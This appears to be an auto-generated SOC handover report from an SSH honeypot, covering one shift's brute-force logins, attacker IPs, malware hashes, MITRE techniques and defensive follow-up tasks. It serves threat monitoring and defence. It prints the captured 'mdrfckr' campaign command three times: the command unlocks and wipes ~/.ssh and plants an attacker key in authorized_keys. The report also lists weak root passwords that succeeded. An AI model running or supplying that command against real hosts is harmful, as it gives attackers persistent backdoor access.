# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-24 |
| **Generated At** | 2026-03-24T13:07:18Z |
| **Shift Time** | 13:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **63** |
| Confirmed Threats | **40** |
| False Positives Filtered | **23** (36.5%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **19** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **45** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **39** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **19** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `operator` | 2 |
| `Guest` | 2 |
| `blank` | 2 |
| `ftp` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `vpn` | 1 |
| `oscar` | 1 |
| `operator2022` | 1 |
| `gitlab` | 1 |
| `prowlarr` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `vpn` | 1 |
| `root` | `oscar` | 1 |
| `operator` | `operator2022` | 1 |
| `root` | `gitlab` | 1 |
| `root` | `prowlarr` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `vpn` | `64.236.176.194` | 2026-03-24T10:50:56 |
| `root` | `oscar` | `64.236.176.194` | 2026-03-24T10:52:21 |
| `root` | `gitlab` | `64.236.176.194` | 2026-03-24T10:53:46 |
| `root` | `prowlarr` | `64.236.176.194` | 2026-03-24T10:55:10 |
| `root` | `qwe123456` | `64.236.176.194` | 2026-03-24T10:56:34 |
| `root` | `nginx123` | `64.236.176.194` | 2026-03-24T10:57:58 |
| `root` | `Huawei12#$` | `64.236.176.194` | 2026-03-24T10:59:22 |
| `root` | `00000000` | `64.236.176.194` | 2026-03-24T11:00:46 |
| `root` | `dstserver` | `64.236.176.194` | 2026-03-24T11:02:06 |
| `root` | `qwerty123456` | `172.173.200.62` | 2026-03-24T11:02:12 |
| `root` | `3245gs5662d34` | `172.173.200.62` | 2026-03-24T11:02:57 |
| `root` | `!QAZ@wsx` | `64.236.176.194` | 2026-03-24T11:03:28 |
| `root` | `minima` | `64.236.176.194` | 2026-03-24T11:04:50 |
| `root` | `sonar123` | `64.236.176.194` | 2026-03-24T11:06:15 |
| `root` | `oscar123` | `64.236.176.194` | 2026-03-24T11:07:40 |
| `root` | `lighthouse` | `64.236.176.194` | 2026-03-24T11:09:05 |
| `root` | `1234qwer` | `217.154.38.181` | 2026-03-24T11:15:11 |
| `root` | `1q2w3e` | `34.146.217.105` | 2026-03-24T11:20:06 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.154.38.181`, `172.173.200.62`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **31** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 1 | HIGH |
| `AS272775` | costa & rodrigues serviço de telecomunicações ltda | 1 | HIGH |
| `AS1136` | KPN B.V. | 1 | LOW |
| `AS328611` | Libyan Elite Company for Technical Solutions | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a8e2895696dc

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-03-24 11:02 |
| **Last Seen** | 2026-03-24 11:03 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 11:02:01` | `cowrie.session.connect` |
| `2026-03-24 11:02:03` | `cowrie.client.version` |
| `2026-03-24 11:02:05` | `cowrie.client.kex` |
| `2026-03-24 11:02:12` | `cowrie.login.success` |
| `2026-03-24 11:02:13` | `cowrie.session.params` |
| `2026-03-24 11:02:13` | `cowrie.command.input` |
| `2026-03-24 11:02:13` | `cowrie.command.failed` |
| `2026-03-24 11:02:13` | `cowrie.log.closed` |
| `2026-03-24 11:02:17` | `cowrie.session.params` |
| `2026-03-24 11:02:17` | `cowrie.command.input` |
| `2026-03-24 11:02:27` | `cowrie.session.file_download` |
| `2026-03-24 11:02:27` | `cowrie.log.closed` |
| `2026-03-24 11:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f9b71df775

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-03-24 11:02 |
| **Last Seen** | 2026-03-24 11:03 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 11:02:42` | `cowrie.session.connect` |
| `2026-03-24 11:02:42` | `cowrie.client.version` |
| `2026-03-24 11:02:42` | `cowrie.client.kex` |
| `2026-03-24 11:02:57` | `cowrie.login.success` |
| `2026-03-24 11:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef88001ed543

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-03-24 11:15 |
| **Last Seen** | 2026-03-24 11:15 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 11:15:10` | `cowrie.session.connect` |
| `2026-03-24 11:15:10` | `cowrie.client.version` |
| `2026-03-24 11:15:10` | `cowrie.client.kex` |
| `2026-03-24 11:15:11` | `cowrie.login.success` |
| `2026-03-24 11:15:11` | `cowrie.session.params` |
| `2026-03-24 11:15:11` | `cowrie.command.input` |
| `2026-03-24 11:15:11` | `cowrie.command.failed` |
| `2026-03-24 11:15:11` | `cowrie.log.closed` |
| `2026-03-24 11:15:12` | `cowrie.session.params` |
| `2026-03-24 11:15:12` | `cowrie.command.input` |
| `2026-03-24 11:15:12` | `cowrie.session.file_download` |
| `2026-03-24 11:15:12` | `cowrie.log.closed` |
| `2026-03-24 11:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b0c1dd03675

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-03-24 11:20 |
| **Last Seen** | 2026-03-24 11:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 11:20:03` | `cowrie.session.connect` |
| `2026-03-24 11:20:04` | `cowrie.client.version` |
| `2026-03-24 11:20:04` | `cowrie.client.kex` |
| `2026-03-24 11:20:06` | `cowrie.login.success` |
| `2026-03-24 11:20:07` | `cowrie.direct-tcpip.request` |
| `2026-03-24 11:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `171.97.104[.]10` | **11** | 2026-03-24 11:08 | 2026-03-24 13:06 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `217.154.38[.]181` | **3** | 2026-03-24 11:07 | 2026-03-24 11:12 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `102.211.7[.]162` | 1 | 2026-03-24 10:59 | 2026-03-24 10:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.38.3[.]181` | 1 | 2026-03-24 12:16 | 2026-03-24 12:17 | 11s | 0 | `T1592` | 🟢 LOW |
| `102.90.34[.]90` | 1 | 2026-03-24 12:17 | 2026-03-24 12:19 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.147.248[.]23` | 1 | 2026-03-24 10:53 | 2026-03-24 10:53 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-03-24 10:59 | 2026-03-24 11:00 | 5s | 0 | `T1592` | 🟢 LOW |
| `110.25.105[.]224` | 1 | 2026-03-24 11:39 | 2026-03-24 11:39 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.153[.]102` | 1 | 2026-03-24 12:36 | 2026-03-24 12:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.129.157[.]189` | 1 | 2026-03-24 11:38 | 2026-03-24 11:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.167.20[.]72` | 1 | 2026-03-24 11:57 | 2026-03-24 11:57 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.185.225[.]78` | 1 | 2026-03-24 11:31 | 2026-03-24 11:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-24 11:52 | 2026-03-24 11:52 | 31s | 0 | `T1592` | 🟢 LOW |
| `172.173.200[.]62` | 1 | 2026-03-24 11:02 | 2026-03-24 11:02 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.99.180[.]141` | 1 | 2026-03-24 12:58 | 2026-03-24 12:58 | 14s | 0 | `T1592` | 🟢 LOW |
| `34.238.124[.]103` | 1 | 2026-03-24 12:57 | 2026-03-24 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `38.56.81[.]68` | 1 | 2026-03-24 11:26 | 2026-03-24 11:27 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]7` | 1 | 2026-03-24 12:29 | 2026-03-24 12:29 | 31s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]38` | 1 | 2026-03-24 11:39 | 2026-03-24 11:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.217.40[.]11` | 1 | 2026-03-24 12:27 | 2026-03-24 12:27 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.115.53[.]172` | 1 | 2026-03-24 11:50 | 2026-03-24 11:50 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.227.140[.]125` | 1 | 2026-03-24 11:12 | 2026-03-24 11:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `88.204.153[.]114` | 1 | 2026-03-24 11:54 | 2026-03-24 11:54 | 12s | 0 | `T1592` | 🟢 LOW |
| `93.145.118[.]40` | 1 | 2026-03-24 11:01 | 2026-03-24 11:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.153[.]38` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 15 |
| `124.129.157[.]189` | CN | China Unicom Shandong province network | **100** ⚠️ | 30 |
| `58.115.53[.]172` | TW | Hoshin Multimedia Center Inc | **100** ⚠️ | 2 |
| `102.38.3[.]181` | LY | Giga for Telecommunication and Technology Limited | **100** ⚠️ | 8 |
| `83.227.140[.]125` | SE | Telenor Sverige AB | **100** ⚠️ | 40 |
| `203.99.180[.]141` | PK | Pakistan Telecommunication Company Limited | **100** ⚠️ | 3 |
| `34.146.217[.]105` | JP | Google LLC | **100** ⚠️ | 50 |
| `50.217.40[.]11` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 45 |
| `128.185.225[.]78` | IN | BHARTI-AIRTEL | **100** ⚠️ | 12 |
| `102.211.7[.]162` | LY | LibyanElite | **100** ⚠️ | 15 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 41 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 14 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 63 cases |
| Tool 34  | Credential Extractor        | ✅ 39 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (36.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 24 recon entry/entries in table (2 group(s) consolidating 14 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-24T13:07:18Z_
